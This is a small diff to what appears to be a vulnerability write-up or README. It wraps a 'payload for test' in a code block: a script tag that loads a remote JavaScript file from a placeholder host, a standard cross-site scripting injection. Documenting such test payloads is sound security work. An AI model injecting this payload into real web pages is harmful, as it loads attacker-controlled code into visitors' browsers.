@@ -45,5 +45,6 @@ ScreenShot of page
 
   use this payload for test :
 
-          <script src=https://YourSiteName.com/eksss.js></script>
-  
+```js
+   <script src=https://YourSiteName.com/eksss.js></script>
+```  
